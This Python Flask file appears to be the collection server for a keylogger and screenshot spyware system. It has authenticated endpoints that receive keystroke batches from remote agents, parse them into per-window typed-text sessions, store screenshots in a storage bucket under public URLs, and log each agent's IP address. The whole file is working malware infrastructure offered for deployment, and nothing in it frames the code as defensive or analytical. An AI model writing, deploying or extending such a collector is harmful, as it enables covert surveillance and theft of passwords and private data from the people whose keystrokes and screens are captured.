# collector.py - Vercel + Supabase Version
from flask import Flask, request, jsonify
import os
from datetime import datetime
import hmac, hashlib, base64
import psycopg2
from psycopg2.pool import SimpleConnectionPool
from supabase import create_client, Client
from dotenv import load_dotenv
import io

# Load environment variables
load_dotenv()

# Configuration from environment variables
DATABASE_URL = os.getenv("DATABASE_URL")
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")
API_TOKEN = os.getenv("API_TOKEN")
HMAC_SECRET = os.getenv("HMAC_SECRET").encode()
STORAGE_BUCKET = os.getenv("STORAGE_BUCKET", "screenshots")

# Initialize Supabase client for storage
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Database connection pool (serverless-friendly)
db_pool = None

def get_db_pool():
    """Get or create database connection pool"""
    global db_pool
    if db_pool is None:
        db_pool = SimpleConnectionPool(
            minconn=1,
            maxconn=10,
            dsn=DATABASE_URL
        )
    return db_pool

app = Flask(__name__)

def verify_hmac(agent_id, payload, signature):
    """Verify HMAC signature"""
    msg = (agent_id or "").encode() + payload
    expected = hmac.new(HMAC_SECRET, msg, hashlib.sha256).digest()
    try:
        sig = base64.b64decode(signature)
    except:
        return False
    return hmac.compare_digest(expected, sig)

def update_agent_metadata(cursor, agent_id, request_obj):
    """Update or insert agent metadata"""
    hostname = agent_id  # Could be enhanced to extract from agent
    ip_address = request_obj.remote_addr
    user_agent = request_obj.headers.get('User-Agent', '')
    
    cursor.execute("""
        INSERT INTO agent_metadata (agent_id, hostname, last_seen, ip_address, user_agent)
        VALUES (%s, %s, CURRENT_TIMESTAMP, %s, %s)
        ON CONFLICT (agent_id) 
        DO UPDATE SET 
            last_seen = CURRENT_TIMESTAMP,
            ip_address = EXCLUDED.ip_address,
            user_agent = EXCLUDED.user_agent
    """, (agent_id, hostname, ip_address, user_agent))

def parse_and_store_keystrokes(cursor, agent_id, text_data):
    """
    Parse incoming keystroke batch and store in database.
    Handles both keystroke_sessions and raw_keystrokes tables.
    """
    lines = text_data.split('\n')
    lines = [line.strip() for line in lines if line.strip()]
    
    current_window = "Unknown"
    session_buffer = ""
    session_start = None
    last_timestamp = None
    
    for line in lines:
        # Check for Window Tag
        if line.startswith("[WIN:"):
            # Save previous session if exists
            if session_buffer.strip() and session_start:
                cursor.execute("""
                    INSERT INTO keystroke_sessions 
                    (agent_id, window_title, session_start, session_end, captured_text)
                    VALUES (%s, %s, %s, %s, %s)
                """, (agent_id, current_window, session_start, last_timestamp or session_start, session_buffer.strip()))
            
            # Extract new window title
            current_window = line.replace("[WIN:", "").replace("]", "").strip()
            session_buffer = ""
            session_start = None
            continue
        
        # Parse: TIMESTAMP CHAR
        parts = line.split(' ', 1)
        if len(parts) < 2:
            continue
        
        ts_str = parts[0].strip()
        char_part = parts[1]
        
        # Parse timestamp
        try:
            timestamp = datetime.fromisoformat(ts_str.replace('Z', '+00:00'))
        except:
            timestamp = datetime.utcnow()
        
        if session_start is None:
            session_start = timestamp
        last_timestamp = timestamp
        
        # Store in raw_keystrokes table for granular tracking
        if char_part.startswith("[") and char_part.endswith("]"):
            # Special key
            special_key = char_part.strip("[]")
            cursor.execute("""
                INSERT INTO raw_keystrokes 
                (agent_id, window_title, special_key, timestamp)
                VALUES (%s, %s, %s, %s)
            """, (agent_id, current_window, special_key, timestamp))
            
            # Add to session buffer
            if special_key == "enter":
                session_buffer += "\n"
            elif special_key == "space":
                session_buffer += " "
        else:
            # Regular character
            cursor.execute("""
                INSERT INTO raw_keystrokes 
                (agent_id, window_title, keystroke, timestamp)
                VALUES (%s, %s, %s, %s)
            """, (agent_id, current_window, char_part, timestamp))
            
            session_buffer += char_part
    
    # Save final session
    if session_buffer.strip() and session_start:
        cursor.execute("""
            INSERT INTO keystroke_sessions 
            (agent_id, window_title, session_start, session_end, captured_text)
            VALUES (%s, %s, %s, %s, %s)
        """, (agent_id, current_window, session_start, last_timestamp or session_start, session_buffer.strip()))

def upload_screenshot_to_storage(agent_id, screenshot_bytes, window_title="Unknown", trigger_reason="periodic"):
    """Upload screenshot to Supabase Storage and record metadata in database"""
    pool = get_db_pool()
    conn = pool.getconn()
    
    try:
        cursor = conn.cursor()
        
        # Generate unique filename
        timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S")
        file_name = f"{agent_id}_{timestamp}.png"
        file_path = f"{agent_id}/{file_name}"
        
        # Upload to Supabase Storage
        response = supabase.storage.from_(STORAGE_BUCKET).upload(
            file_path,
            screenshot_bytes,
            file_options={"content-type": "image/png"}
        )
        
        # Get public URL
        storage_url = supabase.storage.from_(STORAGE_BUCKET).get_public_url(file_path)
        
        # Store metadata in database
        cursor.execute("""
            INSERT INTO screenshots 
            (agent_id, window_title, trigger_reason, storage_url, file_name, file_size_bytes)
            VALUES (%s, %s, %s, %s, %s, %s)
        """, (agent_id, window_title, trigger_reason, storage_url, file_name, len(screenshot_bytes)))
        
        conn.commit()
        return storage_url
        
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        pool.putconn(conn)

@app.route("/collect/text", methods=["POST"])
def collect_text():
    """Endpoint to collect keystroke data"""
    # Verify token
    token = request.headers.get("X-Auth-Token", "")
    if token != API_TOKEN:
        return jsonify({"error": "unauthorized"}), 401
    
    # Get data
    agent_id = request.form.get("agent_id", "unknown")
    data = request.form.get("data", "")
    signature = request.headers.get("X-Signature", "")
    
    # Verify HMAC
    if not verify_hmac(agent_id, data.encode("utf-8"), signature):
        return jsonify({"error": "bad signature"}), 403
    
    # Store in database
    pool = get_db_pool()
    conn = pool.getconn()
    
    try:
        cursor = conn.cursor()
        
        # Update agent metadata
        update_agent_metadata(cursor, agent_id, request)
        
        # Parse and store keystrokes
        parse_and_store_keystrokes(cursor, agent_id, data)
        
        conn.commit()
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        conn.rollback()
        return jsonify({"error": str(e)}), 500
    finally:
        pool.putconn(conn)

@app.route("/collect/screenshot", methods=["POST"])
def collect_screenshot():
    """Endpoint to collect screenshots"""
    # Verify token
    token = request.headers.get("X-Auth-Token", "")
    if token != API_TOKEN:
        return jsonify({"error": "unauthorized"}), 401
    
    # Get data
    agent_id = request.form.get("agent_id", "unknown")
    window_title = request.form.get("window_title", "Unknown")
    trigger_reason = request.form.get("trigger_reason", "periodic")
    signature = request.headers.get("X-Signature", "")
    
    file = request.files.get("screenshot")
    if file is None:
        return jsonify({"error": "no file"}), 400
    
    content = file.read()
    
    # Verify HMAC
    if not verify_hmac(agent_id, content, signature):
        return jsonify({"error": "bad signature"}), 403
    
    try:
        # Update agent metadata
        pool = get_db_pool()
        conn = pool.getconn()
        cursor = conn.cursor()
        update_agent_metadata(cursor, agent_id, request)
        conn.commit()
        pool.putconn(conn)
        
        # Upload screenshot
        storage_url = upload_screenshot_to_storage(agent_id, content, window_title, trigger_reason)
        
        return jsonify({"status": "ok", "url": storage_url}), 200
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/health", methods=["GET"])
def health():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "timestamp": datetime.utcnow().isoformat()}), 200

# Vercel serverless function entry point
app = app
